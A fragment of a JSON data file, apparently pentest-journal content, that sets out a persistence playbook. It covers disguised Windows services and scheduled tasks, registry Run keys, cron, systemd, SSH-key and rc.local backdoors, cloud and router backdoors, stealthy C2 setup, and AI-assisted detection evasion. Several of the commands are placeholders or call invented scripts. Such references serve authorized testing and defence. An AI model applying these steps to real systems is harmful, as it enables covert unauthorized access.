+            "details": "Plan multiple redundant persistence mechanisms",
+            "command": "python3 redundancy_planner.py --primary-methods ~/pt-journal-sessions/*/evidence/selected_methods.txt --backup-count 3 --output ~/pt-journal-sessions/*/evidence/redundancy_plan.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Windows Persistence Implementation",
+        "steps": [
+          {
+            "title": "Registry Persistence",
+            "details": "Implement registry-based persistence mechanisms",
+            "command": "powershell -enc \"New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsSecurity' -Value 'powershell -enc ...'\""
+          },
+          {
+            "title": "Service Creation",
+            "details": "Create persistent Windows services",
+            "command": "sc create \"System Maintenance\" binpath= \"C:\\Windows\\System32\\svchost.exe\" start= auto DisplayName= \"System Maintenance Service\""
+          },
+          {
+            "title": "WMI Event Subscription",
+            "details": "Implement WMI-based persistence",
+            "command": "powershell -enc \"Register-WmiEvent -Class Win32_ProcessStartTrace -SourceIdentifier 'ProcessStart' -Action { ... }\""
+          },
+          {
+            "title": "Scheduled Task Persistence",
+            "details": "Create persistent scheduled tasks",
+            "command": "schtasks /create /tn \"Windows Update\" /tr \"powershell -enc ...\" /sc onlogon /ru SYSTEM"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Linux Persistence Implementation",
+        "steps": [
+          {
+            "title": "Cron Job Persistence",
+            "details": "Establish persistent cron jobs",
+            "command": "echo '0 */6 * * * /usr/local/bin/system_check.sh' | crontab - && chmod 600 /var/spool/cron/crontabs/*"
+          },
+          {
+            "title": "Systemd Service Persistence",
+            "details": "Create persistent systemd services",
+            "command": "sudo cp persistence.service /etc/systemd/system/ && sudo systemctl enable persistence.service && sudo systemctl start persistence.service"
+          },
+          {
+            "title": "SSH Key Persistence",
+            "details": "Add persistent SSH access keys",
+            "command": "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3... user@host' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+          },
+          {
+            "title": "Init Script Persistence",
+            "details": "Modify init scripts for persistence",
+            "command": "echo '/usr/local/bin/persistence.sh' >> /etc/rc.local && chmod +x /etc/rc.local"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Cloud & Network Persistence",
+        "steps": [
+          {
+            "title": "Cloud Instance Persistence",
+            "details": "Establish persistence in cloud environments",
+            "command": "python3 cloud_persistence.py --provider aws --instance-id i-1234567890abcdef0 --method iam_role,instance_profile --output ~/pt-journal-sessions/*/evidence/cloud_persistence.txt"
+          },
+          {
+            "title": "Container Persistence",
+            "details": "Implement persistence in containerized environments",
+            "command": "python3 container_persistence.py --target docker --method volume_mount,host_network --output ~/pt-journal-sessions/*/evidence/container_persistence.txt"
+          },
+          {
+            "title": "Network Device Persistence",
+            "details": "Establish persistence on network infrastructure",
+            "command": "python3 network_persistence.py --device router/firewall --method config_backdoor,firmware_mod --output ~/pt-journal-sessions/*/evidence/network_persistence.txt"
+          },
+          {
+            "title": "C2 Communication Setup",
+            "details": "Establish command and control communications",
+            "command": "python3 c2_setup.py --domain c2.target.com --port 443 --protocol https,dns --encryption aes256 --output ~/pt-journal-sessions/*/evidence/c2_config.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Multi-Platform Persistence Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Platform Analysis",
+            "description": "Analyze target platforms and select persistence methods",
+            "command": "python3 platform_analyzer.py --target target_network --output ~/pt-journal-sessions/*/evidence/platform_analysis.txt"
+          },
+          {
+            "label": "Day 2-3: Persistence Implementation",
+            "description": "Implement primary and backup persistence mechanisms",
+            "command": "python3 deploy_persistence.py --methods ~/pt-journal-sessions/*/evidence/selected_methods.txt --target target_system --stealth"
+          },
+          {
+            "label": "Day 4: C2 Establishment",
+            "description": "Establish and test command and control communications",
+            "command": "python3 c2_deploy.py --config ~/pt-journal-sessions/*/evidence/c2_config.txt --test-connectivity"
+          },
+          {
+            "label": "Day 5: Redundancy Setup",
+            "description": "Implement redundant persistence mechanisms",
+            "command": "python3 redundancy_deploy.py --primary ~/pt-journal-sessions/*/evidence/persistence.txt --backup-methods service,cron,registry"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Service created successfully: System Maintenance",
+        "meaning": "Windows service persistence established",
+        "severity": "High"
+      },
+      {
+        "indicator": "Cron job installed: /etc/cron.d/persistence",
+        "meaning": "Linux cron persistence established",
+        "severity": "High"
+      },
+      {
+        "indicator": "C2 beacon received: Heartbeat successful",
+        "meaning": "Command and control communication established",
+        "severity": "High"
+      },
+      {
+        "indicator": "Cloud IAM role created: persistence_role",
+        "meaning": "Cloud persistence via IAM established",
+        "severity": "High"
+      },
+      {
+        "indicator": "Redundancy level: 3 backup mechanisms",
+        "meaning": "Multiple redundant persistence methods active",
+        "severity": "High"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Living Off the Land Persistence",
+        "scenario": "Use legitimate system tools for persistence",
+        "command": "python3 lotl_persistence.py --target-system windows --allowed-tools powershell,wmi,schtask --stealth-level maximum",
+        "notes": [
+          "LOLBin techniques reduce detection signatures"
+        ]
+      },
+      {
+        "title": "AI-Generated Persistence",
+        "scenario": "Use AI to create custom persistence mechanisms",
+        "command": "python3 ai_persistence.py --target-platform mixed --detection-evasion adaptive --custom-methods --output ~/pt-journal-sessions/*/evidence/ai_persistence.py",
+        "notes": [
+          "AI can create novel persistence techniques"
+        ]
+      },
+      {
+        "title": "Quantum-Resistant C2",
+        "scenario": "Implement quantum-resistant C2 communications",
+        "command": "python3 quantum_c2.py --domain c2.target.com --encryption post-quantum --key-exchange ntru --output ~/pt-journal-sessions/*/evidence/quantum_c2.txt",
+        "notes": [
+          "Future-proofing against quantum computing attacks"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Persistence Tools Comparison",
+      "columns": ["Tool", "Platform", "Stealth", "Flexibility", "Detection Resistance"],
+      "rows": [
+        ["Empire", "Windows/Linux", "High", "Very High", "High"],
+        ["Metasploit", "Cross-platform", "Medium", "High", "Medium"],
+        ["Custom Scripts", "Any", "Very High", "Complete", "Very High"],
+        ["PowerShell", "Windows", "High", "High", "High"],
+        ["Systemd/Cron", "Linux", "Medium", "Low", "Low"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Windows Persistence Techniques",
+        "url": "https://attack.mitre.org/techniques/T1543/",
+        "description": "MITRE ATT&CK techniques for Windows persistence"
+      },
+      {
+        "label": "Linux Persistence Guide",
+        "url": "https://www.sans.org/white-papers/36846/",
+        "description": "Comprehensive Linux persistence techniques"
+      },
+      {
+        "label": "Cloud Persistence Research",
+        "url": "https://www.blackhat.com/presentations/bh-usa-21/",
+        "description": "Latest research in cloud persistence techniques"
+      }
+    ]
   }
 ]
